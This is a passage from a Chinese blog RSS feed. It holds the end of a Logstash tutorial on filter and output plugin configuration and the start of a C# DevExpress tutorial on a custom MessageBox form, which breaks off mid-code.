&lt;p&gt;另外，codec还可以编解码protobuf、fluent、nmap等，可以参考：&lt;a href=&quot;https://www.elastic.co/guide/en/logstash/current/codec-plugins.html&quot;&gt;codec-plugins&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;logstash 威力强大的最重要的就是因为有丰富的过滤器插件。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Grok 正则捕获&lt;br/&gt;Grok 是 Logstash 最重要的插件，可以在 grok 里预定义好命名正则表达式，在之后(grok参数或者其他正则表达式里)引用它，示例&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;input {stdin{}}
filter {
    grok {
        match =&amp;gt; {
            &quot;message&quot; =&amp;gt; &quot;\s+(?&amp;lt;request_time&amp;gt;\d+(?:\.\d+)?)\s+&quot;
        }
    }
}
output {stdout{}}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;启动后输入&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;hello 123.123 world&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以，看到配置到了我们自定义的变量request_time&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/662544/202003/662544-20200318230014391-303703240.png&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;时间处理&lt;br/&gt;filters/date 插件可以用来转换你的日志记录中的时间字符串，变成 LogStash::Timestamp 对象，然后转存到 @timestamp 字段里。支持ISO8601、UNIX、UNIX_MS、TAI64N、Joda-Time 等格式&lt;br/&gt;示例&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;input {stdin{}}
filter{
    date{
        match =&amp;gt; [&quot;message&quot;,&quot;yyyyMMdd&quot;]
    }
}
output {stdout{}}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如下&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/662544/202003/662544-20200318230025499-1244197257.png&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;数据修改&lt;br/&gt;filters/mutate 提供了丰富的基础类型数据处理能力，包括类型转换，字符串处理和字段处理等。&lt;br/&gt;转换类型，支持integer、float和string。&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;filter {
    mutate {
        convert =&amp;gt; [&quot;request_time&quot;, &quot;float&quot;]
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;字符串处理&lt;br/&gt;可以对字符串进行split、join、merge、strip、rename、replace等操作&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;input {stdin{}}
filter {
    mutate {
        split =&amp;gt; [&quot;message&quot;, &quot;|&quot;]
    }
    mutate {
        join =&amp;gt; [&quot;message&quot;, &quot;,&quot;]
    }
}
output {stdout{}}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;先用|分割成数组，再通过,合成字符串&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/662544/202003/662544-20200318230031677-905257655.png&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;拆分事件&lt;br/&gt;split插件可以把一行数据，拆分成多个事件&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;input {stdin{}}
filter {
    split {
        field =&amp;gt; &quot;message&quot;
        terminator =&amp;gt; &quot;#&quot;
    }
}
output {stdout{}}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/662544/202003/662544-20200318230046566-479321270.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;另外，还有JSON编解码、USerAgent匹配归类、Key-Value切分、自定义Ruby处理等插件，更多可以查看：&lt;a href=&quot;https://www.elastic.co/guide/en/logstash/current/filter-plugins.html&quot;&gt;filter-plugins&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;标准输出&lt;br/&gt;和 inputs/stdin 插件一样，outputs/stdout 插件是最基础和简单的输出插件，如下&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;output {
    stdout {
        codec =&amp;gt; rubydebug
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;代表输出到stdout，使用rubydebug格式化&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;保存文件&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;input {stdin{}}
output {
    file {
        path =&amp;gt; &quot;/Users/chenqionghe/web/log/test.log&quot;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看到，已经写入test.log文件&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/662544/202003/662544-20200318230058194-65355355.png&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;输出到ElasticSearch&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;output {
    elasticsearch {
        host =&amp;gt; &quot;127.0.0.1&quot;
        protocol =&amp;gt; &quot;http&quot;
        index =&amp;gt; &quot;logstash-%{type}-%{+YYYY.MM.dd}&quot;
        index_type =&amp;gt; &quot;%{type}&quot;
        workers =&amp;gt; 5
        template_overwrite =&amp;gt; true
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;启动后，请求nginx后日志如下&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/662544/202003/662544-20200318230149133-417811722.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到已经打印出来了，我们去使用kibana控制台查询es，可以看到索引和数据都已经有了&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/662544/202003/662544-20200318230206310-1072979574.png&quot;/&gt;&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/662544/202003/662544-20200318230213103-1339433471.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;另外，output还可以设置输出到Redis、发送邮件、执行命令等，更多可以查看&lt;a href=&quot;https://www.elastic.co/guide/en/logstash/current/output-plugins.html&quot;&gt;output-plugins&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;简单地说，logstash最主要的功能是从input获取数据，通过filter处理，再输出到指定的地方。&lt;br/&gt;一般我们收集日志都是在后台运行，建议使用nohup、screen或者supervisor这样的方式启动。&lt;/p&gt;
&lt;p&gt;是不是觉得logstash超简单，意不意外，开不开心，yeah buddy! light weight baby!&lt;/p&gt;
</description>
<pubDate>Wed, 18 Mar 2020 23:13:00 +0000</pubDate>
<dc:creator>雪山飞猪</dc:creator>
<og:description>[toc] 一、什么是Logstash Logstash是一个日志收集器，可以理解为一个管道，或者中间件。 功能是从定义的输入源inputs读取信息，经过filters过滤器处理，输入到定义好的out</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/chenqionghe/p/12521113.html</dc:identifier>
</item>
<item>
<title>玩转控件:重写/重绘Dev中MessageBox弹窗控件 - [Stephen-kzx]</title>
<link>http://www.cnblogs.com/axing/p/12521589.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/axing/p/12521589.html</guid>
<description>&lt;p&gt;　　很久没有更新博客了，本想着直接发一篇《手撕ERP》系列，从控件重写、重绘，到框架搭建，再到部分模块实现+业务的。但是每次动手的时候，都觉得难以下手。直接从数据库设计开始吧，模块设计还没定下来，从模块设计开始吧，winform自带控件和DevExpress控件用起来布局实在太难看了。算了，从低做起吧。接着6-7年前的玩转控件系列开始，工欲善其事必先利其器！利器备好，框架搭建完毕，模块设计就是拖控件而已！&lt;/p&gt;
&lt;p&gt;    &lt;br/&gt;        Talk is Cheap,Show me the Code!&lt;/p&gt;&lt;p&gt;        首先，项目中新建一个窗体（用于后面的弹窗载体），按自己意愿做好布局效果，当然关于皮肤方面，大家可以应用界内很成熟的皮肤控件（具体就不列举了，避免打广告的嫌疑），或者后期自己代码实现。本篇主要介绍如何重写/重绘控件，磨自己的利器，至于利器上贴个动漫图片还是其他花里胡哨的图案，请根据自己的喜好来。大概效果如图（有洁癖的请自己细心布局）：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/116076/202003/116076-20200319003955108-63599598.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 　　窗体后台代码分析如下：&lt;br/&gt;        首先窗体集成DevExpress：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
 &lt;span&gt;public&lt;/span&gt; &lt;span&gt;partial&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; frm_MessageBox : DevExpress.XtraEditors.XtraForm
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 　　其余初始化动作代码如下，备注很详细就不一一列举了：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
&lt;span&gt;///&lt;/span&gt;&lt;span&gt; 确定按钮
&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
&lt;span&gt;private&lt;/span&gt;&lt;span&gt; SimpleButton btn_OK;

&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
&lt;span&gt;///&lt;/span&gt;&lt;span&gt; 取消按钮
&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
&lt;span&gt;private&lt;/span&gt;&lt;span&gt; SimpleButton btn_Cancel;

&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
&lt;span&gt;///&lt;/span&gt;&lt;span&gt; 中止按钮
&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
&lt;span&gt;private&lt;/span&gt;&lt;span&gt; SimpleButton btn_Abort;

&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
&lt;span&gt;///&lt;/span&gt;&lt;span&gt; 重试按钮
&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
&lt;span&gt;private&lt;/span&gt;&lt;span&gt; SimpleButton btn_Retry;

&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
&lt;span&gt;///&lt;/span&gt;&lt;span&gt; 忽略按钮
&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
&lt;span&gt;private&lt;/span&gt;&lt;span&gt; SimpleButton btn_Ignore;

&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
&lt;span&gt;///&lt;/span&gt;&lt;span&gt; 是按钮
&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
&lt;span&gt;private&lt;/span&gt;&lt;span&gt; SimpleButton btn_Yes;

&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
&lt;span&gt;///&lt;/span&gt;&lt;span&gt; 否按钮
&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
&lt;span&gt;private&lt;/span&gt;&lt;span&gt; SimpleButton btn_No;

&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
&lt;span&gt;///&lt;/span&gt;&lt;span&gt; 要在消息框中显示的文本
&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
&lt;span&gt;private&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; text;

&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
&lt;span&gt;///&lt;/span&gt;&lt;span&gt; 要在消息框的标题栏中显示的文本
&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
&lt;span&gt;private&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; caption;

&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
&lt;span&gt;///&lt;/span&gt;&lt;span&gt;  System.Windows.Forms.MessageBoxButtons 值之一，可指定在消息框中显示哪些按钮
&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
&lt;span&gt;private&lt;/span&gt;&lt;span&gt; MessageBoxButtons buttons;

&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
&lt;span&gt;///&lt;/span&gt;&lt;span&gt; System.Windows.Forms.MessageBoxIcon 值之一，它指定在消息框中显示哪个图标
&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
&lt;span&gt;private&lt;/span&gt;&lt;span&gt; MessageBoxIcon icon;

&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
&lt;span&gt;///&lt;/span&gt;&lt;span&gt; System.Windows.Forms.MessageBoxDefaultButton 值之一，可指定消息框中的默认按钮。
&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
&lt;span&gt;private&lt;/span&gt;&lt;span&gt; MessageBoxDefaultButton defaultButton;

&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
&lt;span&gt;///&lt;/span&gt;&lt;span&gt; 消息弹出框参数实体
&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
MessageBoxModel _MessageBoxModel = &lt;span&gt;default&lt;/span&gt;(MessageBoxModel);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;   界面初始化：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
&lt;span&gt;///&lt;/span&gt;&lt;span&gt; 支持修改弹出框的按钮标题描述
&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;pMessageBoxModel&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt;&lt;span&gt; frm_MessageBox(MessageBoxModel pMessageBoxModel)
{
    InitializeComponent();
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (pMessageBoxModel == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
        pMessageBoxModel &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; MessageBoxModel();

    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.ControlBox = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.text =&lt;span&gt; pMessageBoxModel.MsgText;
    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.Text = pMessageBoxModel.FormText ?? &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Stephen's UserControl&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.caption =&lt;span&gt; pMessageBoxModel.FormText;
    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.buttons =&lt;span&gt; pMessageBoxModel.MsgButton;
    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.icon =&lt;span&gt; pMessageBoxModel.MsgIcon;
    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.defaultButton =&lt;span&gt; pMessageBoxModel.MsgxDefaultButton;
    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;._MessageBoxModel =&lt;span&gt; pMessageBoxModel;
}

&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
&lt;span&gt;///&lt;/span&gt;&lt;span&gt; 显示一个具有指定文本、标题、按钮、图标、默认按钮的消息框
&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;text&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;caption&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;buttons&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;icon&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;defaultButton&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; frm_MessageBox(&lt;span&gt;string&lt;/span&gt; text, &lt;span&gt;string&lt;/span&gt;&lt;span&gt; caption, MessageBoxButtons buttons, MessageBoxIcon icon, MessageBoxDefaultButton defaultButton)
{
    InitializeComponent();
    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.ControlBox = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.text =&lt;span&gt; text;
    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.Text = caption ?? &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Stephen's UserControl&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.caption =&lt;span&gt; caption;
    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.buttons =&lt;span&gt; buttons;
    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.icon =&lt;span&gt; icon;
    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.defaultButton =&lt;span&gt; defaultButton;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 窗体Load事件绑定弹窗按钮事件：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;114&quot;&gt;
&lt;pre&gt;
&lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; frm_MessageBox_Load(&lt;span&gt;object&lt;/span&gt;&lt;span&gt; sender, EventArgs e)
{
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; pannelLength =&lt;span&gt; panelButton.Size.Width;
    &lt;/span&gt;&lt;span&gt;switch&lt;/span&gt;&lt;span&gt; (buttons)
    {
        &lt;/span&gt;&lt;span&gt;case&lt;/span&gt;&lt;span&gt; MessageBoxButtons.OK:
            &lt;/span&gt;&lt;span&gt;#region&lt;/span&gt; OK
            &lt;span&gt;this&lt;/span&gt;.btn_OK = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; SimpleButton();
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.panelButton.SuspendLayout();
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;btn_OK&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.btn_OK.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top |&lt;span&gt; System.Windows.Forms.AnchorStyles.Bottom)
                            &lt;/span&gt;|&lt;span&gt; (System.Windows.Forms.AnchorStyles.Right)))));
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_OK.Name = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;btn_OK&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_OK.Size = &lt;span&gt;new&lt;/span&gt; System.Drawing.Size(&lt;span&gt;75&lt;/span&gt;, &lt;span&gt;27&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_OK.Location = &lt;span&gt;new&lt;/span&gt; Point(pannelLength - &lt;span&gt;85&lt;/span&gt;, &lt;span&gt;10&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_OK.TabIndex = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (_MessageBoxModel != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_OK.Text =&lt;span&gt; _MessageBoxModel.YesButtonText;
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;
                &lt;span&gt;this&lt;/span&gt;.btn_OK.Text = sysClass.ssLoadMsgOrDefault(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;SYS000001&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;确定(O)&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;);&lt;span&gt;//&lt;/span&gt;&lt;span&gt;确定(O)&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.btn_OK.Margin = &lt;span&gt;new&lt;/span&gt; Padding(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_OK.Click +=&lt;span&gt; btn_OK_Click;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.panelButton.Controls.Add(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.btn_OK);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.panelButton.ResumeLayout();
            &lt;/span&gt;&lt;span&gt;#endregion&lt;/span&gt;
            &lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;case&lt;/span&gt;&lt;span&gt; MessageBoxButtons.OKCancel:
            &lt;/span&gt;&lt;span&gt;#region&lt;/span&gt; OKCancel
            &lt;span&gt;this&lt;/span&gt;.btn_OK = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; SimpleButton();
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Cancel = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; SimpleButton();
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.panelButton.SuspendLayout();
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;btn_OK&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.btn_OK.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top |&lt;span&gt; System.Windows.Forms.AnchorStyles.Bottom)
                            &lt;/span&gt;|&lt;span&gt; (System.Windows.Forms.AnchorStyles.Right)))));
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_OK.Name = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;btn_OK&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_OK.Size = &lt;span&gt;new&lt;/span&gt; System.Drawing.Size(&lt;span&gt;75&lt;/span&gt;, &lt;span&gt;27&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_OK.Location = &lt;span&gt;new&lt;/span&gt; Point(pannelLength - &lt;span&gt;170&lt;/span&gt;, &lt;span&gt;10&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_OK.TabIndex = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (_MessageBoxModel != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_OK.Text =&lt;span&gt; _MessageBoxModel.YesButtonText;
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;
                &lt;span&gt;this&lt;/span&gt;.btn_OK.Text = sysClass.ssLoadMsgOrDefault(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;SYS000001&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;确定(O)&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;);&lt;span&gt;//&lt;/span&gt;&lt;span&gt;确定(O)&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.btn_OK.Margin = &lt;span&gt;new&lt;/span&gt; Padding(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_OK.Click +=&lt;span&gt; btn_OK_Click;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.panelButton.Controls.Add(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.btn_OK);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;btn_Cancel&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.btn_Cancel.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top |&lt;span&gt; System.Windows.Forms.AnchorStyles.Bottom)
                            &lt;/span&gt;|&lt;span&gt; (System.Windows.Forms.AnchorStyles.Right)))));
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Cancel.Name = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;btn_Cancel&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Cancel.Size = &lt;span&gt;new&lt;/span&gt; System.Drawing.Size(&lt;span&gt;75&lt;/span&gt;, &lt;span&gt;27&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Cancel.Location = &lt;span&gt;new&lt;/span&gt; Point(pannelLength - &lt;span&gt;85&lt;/span&gt;, &lt;span&gt;10&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Cancel.TabIndex = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (_MessageBoxModel != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Cancel.Text =&lt;span&gt; _MessageBoxModel.CancleButtonText;
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;
                &lt;span&gt;this&lt;/span&gt;.btn_Cancel.Text = sysClass.ssLoadMsgOrDefault(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;SYS000002&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;取消(C)&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;);&lt;span&gt;//&lt;/span&gt;&lt;span&gt;取消(C)&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.btn_Cancel.Margin = &lt;span&gt;new&lt;/span&gt; Padding(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Cancel.Click +=&lt;span&gt; btn_Cancel_Click;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.panelButton.Controls.Add(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.btn_Cancel);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.panelButton.ResumeLayout();
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (defaultButton ==&lt;span&gt; MessageBoxDefaultButton.Button1)
            {
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.btn_OK.Select();
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
            {
